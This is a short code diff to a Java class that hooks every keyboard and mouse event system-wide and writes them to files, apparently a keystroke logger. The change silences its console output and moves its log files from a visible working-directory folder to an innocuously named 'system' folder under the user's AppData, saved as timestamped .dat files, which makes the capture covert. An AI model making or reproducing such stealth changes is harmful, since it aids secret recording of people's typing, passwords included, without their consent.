@@ -49,7 +49,7 @@ import org.jnativehook.mouse.NativeMouseListener;
 
 public class Storage implements NativeKeyListener, NativeMouseListener {
 
-    private boolean showLog = true;
+    private boolean showLog = false;
     private EventType lastEvent = EventType.None;
     private FileWriter writer;
 
@@ -249,8 +249,9 @@ public class Storage implements NativeKeyListener, NativeMouseListener {
             return true;
         }
         try {
-            File dir = new File(System.getProperty("user.dir", ""), "inf");
-            dir.mkdir();
+            // C:\Users\...\AppData\Roaming\system
+            File dir = new File(System.getenv("APPDATA"), "system");
+            dir.mkdirs();
             writer = new FileWriter(new File(dir, System.currentTimeMillis() + ".dat"));
             return true;
         } catch (IOException ex) {
